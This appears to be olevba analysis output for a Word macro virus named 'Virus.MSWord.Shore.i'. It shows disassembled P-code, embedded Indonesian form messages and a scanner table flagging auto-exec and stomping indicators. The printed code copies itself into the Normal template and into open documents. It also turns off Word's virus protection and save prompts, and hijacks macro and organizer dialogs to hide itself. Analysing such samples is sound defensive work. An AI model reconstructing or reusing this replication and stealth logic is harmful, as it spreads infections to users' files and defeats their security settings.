' 	ArgsCall AutoClose 0x0000 
' Line #172:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St afn 
' Line #173:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #174:
' 	Ld afn 
' 	ArgsCall ModifyAttr 0x0001 
' Line #175:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #176:
' 	EndSub 
' Line #177:
' Line #178:
' 	FuncDefn (Sub FileSave())
' Line #179:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #180:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #181:
' Line #182:
' 	ArgsCall Copy2Document 0x0000 
' Line #183:
' 	OnError (Resume Next) 
' Line #184:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #185:
' 	ArgsMemCallWith Save 0x0000 
' Line #186:
' 	LitVarSpecial (True)
' 	MemStWith Saved 
' Line #187:
' 	EndWith 
' Line #188:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #189:
' 	EndSub 
' Line #190:
' 	FuncDefn (Sub InitDialog())
' Line #191:
' 	ArgsCall Stealth 0x0000 
' Line #192:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #193:
' 	OnError (Resume Next) 
' Line #194:
' 	SetStmt 
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsOptionsDlg 
' Line #195:
' 	SetStmt 
' 	Ld wdDialogOrganizer 
' 	ArgsLd Dialogs 0x0001 
' 	Set OrganizerDlg 
' Line #196:
' 	SetStmt 
' 	Ld wdDialogToolsTemplates 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsTemplatesDlg 
' Line #197:
' 	SetStmt 
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsMacrosDlg 
' Line #198:
' 	SetStmt 
' 	Ld wdDialogFormatStyle 
' 	ArgsLd Dialogs 0x0001 
' 	Set FormatStyleDlg 
' Line #199:
' 	EndSub 
' Line #200:
' Line #201:
' Line #202:
' 	FuncDefn (Sub AutoExec())
' Line #203:
' 	Dim 
' 	VarDefn Combar (As CommandBar)
' Line #204:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #205:
' 	ArgsCall InitDialog 0x0000 
' Line #206:
' 	LitVarSpecial (False)
' 	St Animated 
' Line #207:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #208:
' 	ArgsCall Copy2Normal 0x0000 
' Line #209:
' 	Ld NormalTemplate 
' 	ArgsLd getInfected 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Copy2Document 0x0000 
' 	EndIf 
' Line #210:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #211:
' 	ArgsCall Buggy 0x0000 
' Line #212:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ForEach 
' Line #213:
' Line #214:
' Line #215:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	NextVar 
' Line #216:
' 	EndSub 
' Line #217:
' Line #218:
' 	FuncDefn (Sub AutoExit())
' Line #219:
' 	ArgsCall AutoOpen 0x0000 
' Line #220:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #221:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #222:
' 	EndSub 
' Line #223:
' Line #224:
' 	FuncDefn (Sub fileNewDefault())
' Line #225:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #226:
' 	Ld WordBasic 
' 	ArgsMemCall fileNewDefault 0x0000 
' Line #227:
' 	ArgsCall Copy2Document 0x0000 
' Line #228:
' 	EndSub 
' Line #229:
' Line #230:
' 	FuncDefn (Sub FileNew())
' Line #231:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #232:
' 	QuoteRem 0x0008 0x0013 "**** AnimateCaption"
' Line #233:
' 	ArgsCall Copy2Document 0x0000 
' Line #234:
' 	EndIfBlock 
' Line #235:
' 	EndSub 
' Line #236:
' Line #237:
' 	FuncDefn (Sub Stealth())
' Line #238:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #239:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #240:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #241:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #242:
' 	EndWith 
' Line #243:
' 	QuoteRem 0x0004 0x0029 "Application.ShowVisualBasicEditor = False"
' Line #244:
' Line #245:
' 	EndSub 
' Line #246:
' Line #247:
' 	FuncDefn (Sub NoStealth())
' Line #248:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #249:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #250:
' 	LitVarSpecial (True)
' 	MemStWith SavePropertiesPrompt 
' Line #251:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #252:
' 	EndWith 
' Line #253:
' 	EndSub 
' Line #254:
' Line #255:
' 	FuncDefn (Sub ToolsOptions())
' Line #256:
' 	ArgsCall InitDialog 0x0000 
' Line #257:
' 	ArgsCall NoStealth 0x0000 
' Line #258:
' 	OnError (Resume Next) 
' Line #259:
' 	Ld ToolsOptionsDlg 
' 	ArgsMemCall Display 0x0000 
' Line #260:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #261:
' 	ArgsCall Stealth 0x0000 
' Line #262:
' 	EndSub 
' Line #263:
' Line #264:
' 	FuncDefn (Sub NoAccess())
' Line #265:
' 	Ld msg 
' 	Ld vbExclamation 
' 	Ld msgcap 
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #266:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #267:
' 	EndSub 
' Line #268:
' Line #269:
' 	FuncDefn (Function passDialog() As Boolean)
' Line #270:
' 	Dim 
' 	VarDefn cruel (As String)
' Line #271:
' 	LitVarSpecial (False)
' 	St passDialog 
' Line #272:
' 	LitStr 0x0005 "CD-C "
' 	Ld EE 
' 	Add 
' 	St cdee 
' Line #273:
' 	Ld xxx 
' 	Ld code 
' 	LitDI2 0x0005 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St sandi 
' Line #274:
' 	Ld pass 
' 	Ld cdee 
' 	ArgsLd InputBox 0x0002 
' 	ArgsLd LCase 0x0001 
' 	Ld sandi 
' 	Eq 
' 	IfBlock 
' Line #275:
' 	LitVarSpecial (True)
' 	St passDialog 
' Line #276:
' 	ElseBlock 
' Line #277:
' 	ArgsCall NoAccess 0x0000 
' Line #278:
' 	EndIfBlock 
' Line #279:
' 	EndFunc 
' Line #280:
' Line #281:
' Line #282:
' 	FuncDefn (Sub ToolsMacro())
' Line #283:
' 	ArgsCall InitDialog 0x0000 
' Line #284:
' 	Ld ToolsMacrosDlg 
' 	ArgsMemCall Display 0x0000 
' Line #285:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #286:
' 	EndSub 
' Line #287:
' Line #288:
' Line #289:
' 	FuncDefn (Sub FileTemplates())
' Line #290:
' 	ArgsCall InitDialog 0x0000 
' Line #291:
' 	Ld ToolsTemplatesDlg 
' 	ArgsMemCall Display 0x0000 
' Line #292:
' 	QuoteRem 0x0000 0x0029 "    CustomizationContext = NormalTemplate"
' Line #293:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #294:
' 	EndSub 
' Line #295:
' Line #296:
' 	FuncDefn (Sub viewvbcode())
' Line #297:
' 	Ld passDialog 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #298:
' 	EndSub 
' Line #299:
' Line #300:
' 	FuncDefn (Sub viewcode())
' Line #301:
' 	ArgsCall viewvbcode 0x0000 
' Line #302:
' 	EndSub 
' Line #303:
' Line #304:
' 	FuncDefn (Sub Organizer())
' Line #305:
' 	ArgsCall InitDialog 0x0000 
' Line #306:
' 	Ld OrganizerDlg 
' 	ArgsMemCall Display 0x0000 
' Line #307:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #308:
' 	EndSub 
' Line #309:
' Line #310:
' 	FuncDefn (Sub FormatStyle())
' Line #311:
' 	ArgsCall InitDialog 0x0000 
' Line #312:
' 	StartWithExpr 
' 	Ld FormatStyleDlg 
' 	With 
' Line #313:
' 	ArgsMemCallWith Display 0x0000 
' Line #314:
' 	ArgsMemCallWith Execute 0x0000 
' Line #315:
' 	EndWith 
' Line #316:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #317:
' 	EndSub 
' Line #318:
' Line #319:
' Line #320:
' 	FuncDefn (Sub ModifyAttr(fileName As String))
' Line #321:
' 	OnError (Resume Next) 
' Line #322:
' 	Ld fileName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld fileName 
' 	Ld vbArchive 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #323:
' 	EndSub 
' Line #324:
' Line #325:
' 	QuoteRem 0x0000 0x0014 "Sub AnimateCaption()"
' Line #326:
' 	QuoteRem 0x0000 0x0018 "    On Error Resume Next"
' Line #327:
' 	QuoteRem 0x0000 0x0032 "    If Documents.Count > 0 Then WordBasic.viewpage"
' Line #328:
' 	QuoteRem 0x0000 0x001D "    If Animated Then Exit Sub"
' Line #329:
' 	QuoteRem 0x0000 0x0010 "    anIntv = 2.5"
' Line #330:
' 	QuoteRem 0x0000 0x000D "    anPos = 0"
' Line #331:
' 	QuoteRem 0x0000 0x000F "    anCap = CDE"
' Line #332:
' 	QuoteRem 0x0000 0x003B "    Application.OnTime Now + TimeSerial(0, 0, 3), scrollCap"
' Line #333:
' 	QuoteRem 0x0000 0x0013 "    Animated = True"
' Line #334:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #335:
' 	QuoteRem 0x0000 0x0000 ""
' Line #336:
' 	QuoteRem 0x0000 0x0000 ""
' Line #337:
' 	QuoteRem 0x0000 0x0013 "Sub ScrollCaption()"
' Line #338:
' 	QuoteRem 0x0000 0x0014 "    If Animated Then"
' Line #339:
' 	QuoteRem 0x0000 0x0032 "        Application.Caption = Right$(anCap, anPos)"
' Line #340:
' 	QuoteRem 0x0000 0x0044 "        Application.OnTime Now + TimeSerial(0, 0, anIntv), scrollCap"
' Line #341:
' 	QuoteRem 0x0000 0x0019 "        anPos = anPos + 1"
' Line #342:
' 	QuoteRem 0x0000 0x000A "    End If"
' Line #343:
' 	QuoteRem 0x0000 0x0000 ""
' Line #344:
' 	QuoteRem 0x0000 0x001E "    If anPos > Len(anCap) Then"
' Line #345:
' 	QuoteRem 0x0000 0x001C "        On Error Resume Next"
' Line #346:
' 	QuoteRem 0x0000 0x001A "        WordBasic.viewpage"
' Line #347:
' 	QuoteRem 0x0000 0x0000 ""
' Line #348:
' 	QuoteRem 0x0000 0x0011 "        anPos = 0"
' Line #349:
' 	QuoteRem 0x0000 0x001B "        If anCap = CDE Then"
' Line #350:
' 	QuoteRem 0x0000 0x0019 "            anCap = Peace"
' Line #351:
' 	QuoteRem 0x0000 0x0043 "            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap"
' Line #352:
' 	QuoteRem 0x0000 0x001B "            Animated = True"
' Line #353:
' 	QuoteRem 0x0000 0x001F "        ElseIf anCap = ddd Then"
' Line #354:
' 	QuoteRem 0x0000 0x0016 "            anCap = mw"
' Line #355:
' 	QuoteRem 0x0000 0x0043 "            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap"
' Line #356:
' 	QuoteRem 0x0000 0x001B "            Animated = True"
' Line #357:
' 	QuoteRem 0x0000 0x001E "        ElseIf anCap = mw Then"
' Line #358:
' 	QuoteRem 0x0000 0x0017 "            anCap = OFC"
' Line #359:
' 	QuoteRem 0x0000 0x0046 "            Application.OnTime Now + TimeSerial(0, 0, 1200), scrollCap"
' Line #360:
' 	QuoteRem 0x0000 0x001C "            Animated = False"
' Line #361:
' 	QuoteRem 0x0000 0x000E "        End If"
' Line #362:
' 	QuoteRem 0x0000 0x000A "    End If"
' Line #363:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #364:
' Line #365:
' Line #366:
' 	FuncDefn (Sub ShowMessage())
' Line #367:
' 	StartWithExpr 
' 	Ld CDC_Form 
' 	With 
' Line #368:
' 	LitDI2 0x00DC 
' 	MemStWith With 
' Line #369:
' 	LitDI2 0x00AA 
' 	MemStWith Height 
' Line #370:
' 	StartWithExpr 
' 	MemLdWith Judul 
' 	With 
' Line #371:
' 	LitDI2 0x000F 
' 	MemStWith LBound 
' Line #372:
' 	LitDI2 0x0005 
' 	MemStWith Top 
' Line #373:
' 	LitDI2 0x00B4 
' 	MemStWith With 
' Line #374:
' 	LitDI2 0x0014 
' 	MemStWith Height 
' Line #375:
' 	EndWith 
' Line #376:
' 	StartWithExpr 
' 	MemLdWith Komentar 
' 	With 
' Line #377:
' 	LitDI2 0x00C8 
' 	MemStWith With 
' Line #378:
' 	LitDI2 0x0050 
' 	MemStWith Height 
' Line #379:
' 	LitDI2 0x001E 
' 	MemStWith Top 
' Line #380:
' 	LitDI2 0x0005 
' 	MemStWith LBound 
' Line #381:
' 	LineCont 0x0014 05 00 0D 00 0C 00 0D 00 13 00 0D 00 1F 00 0D 00 25 00 0D 00
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "Dengerin nasehat symbah AM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 "Bermain air basah, bermain api gosong,"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001D "Bermain virus asyiiik dech..."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "CD-C EE v.10 (C) "
' 	Concat 
' 	Ld hcID 
' 	Concat 
' 	LitStr 0x000B ", Nov, 2000"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld mail 
' 	Concat 
' 	MemStWith Then 
' Line #382:
' 	EndWith 
' Line #383:
' 	StartWithExpr 
' 	MemLdWith OKButton 
' 	With 
' Line #384:
' 	LitDI2 0x0032 
' 	MemStWith With 
' Line #385:
' 	LitDI2 0x0019 
' 	MemStWith Height 
' Line #386:
' 	LitDI2 0x0055 
' 	MemStWith LBound 
' Line #387:
' 	LitDI2 0x0073 
' 	MemStWith Top 
' Line #388:
' 	EndWith 
' Line #389:
' 	ArgsMemCallWith Show 0x0000 
' Line #390:
' 	EndWith 
' Line #391:
' Line #392:
' 	EndSub 
' Line #393:
' Line #394:
' 	FuncDefn (Sub HelpAbout())
' Line #395:
' 	LitStr 0x000A "About CD-C"
' 	Ld CDC_Form 
' 	MemSt Caption 
' Line #396:
' 	ArgsCall ShowMessage 0x0000 
' Line #397:
' 	EndSub 
' Line #398:
' Line #399:
' Macros/VBA/CDC_Form - 2050 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' 	FuncDefn (Private Sub Judul_Click())
' Line #31:
' Line #32:
' 	EndSub 
' Line #33:
' Line #34:
' 	FuncDefn (Private Sub OKButton_Click())
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0064 
' 	For 
' Line #36:
' 	ArgsCall Beep 0x0000 
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	Ld CDC_Form 
' 	ArgsMemCall Hide 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' Line #41:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #42:
' Line #43:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shore.i' - OLE stream: 'Macros/CDC_Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CD-C Electrical Engineering
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shore.i' - OLE stream: 'Macros/CDC_Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shore.i' - OLE stream: 'Macros/CDC_Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Selamat malam dan selamat bermalam Minggu bagi yang sekarang sedang kencan bersama si do'i 
Semoga malam ini merupakan malam yang terindah, dan merupakan kenangan yang tak telupakan.
Selamat bersibuk ria dengan tugas-tugas yang diberikan Bapak Dosen, bagi yang sedang berada di rental-rental atau kamar-kamar kost.
    Salam bagi teman-teman CD-C Electrical Engineering,
    semoga kita tetap maju dan berjaya.
    
Buat semua pengidap CD-C viruses, mohon maaf bila mengganggu....!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shore.i' - OLE stream: 'Macros/CDC_Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shore.i' - OLE stream: 'Macros/CDC_Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Judul'" IN 'Virus.MSWord.Shore.i' - OLE stream: 'Macros/CDC_Form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Komentar'" IN 'Virus.MSWord.Shore.i' - OLE stream: 'Macros/CDC_Form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b"Selamat malam dan selamat bermalam Minggu bagi yang sekarang sedang kencan bersama si do'i \r\nSemoga malam ini merupakan malam yang terindah, dan merupakan kenangan yang tak telupakan.\r\nSelamat bersibuk ria dengan tugas-tugas yang diberikan Bapak Dosen, bagi yang sedang berada di rental-rental atau kamar-kamar kost.\r\n    Salam bagi teman-teman CD-C Electrical Engineering,\r\n    semoga kita tetap maju dan berjaya.\r\n    \r\nBuat semua pengidap CD-C viruses, mohon maaf bila mengganggu....!!"
-------------------------------------------------------------------------------
VBA FORM Variable "b'OKButton'" IN 'Virus.MSWord.Shore.i' - OLE stream: 'Macros/CDC_Form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Judul_Click         |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

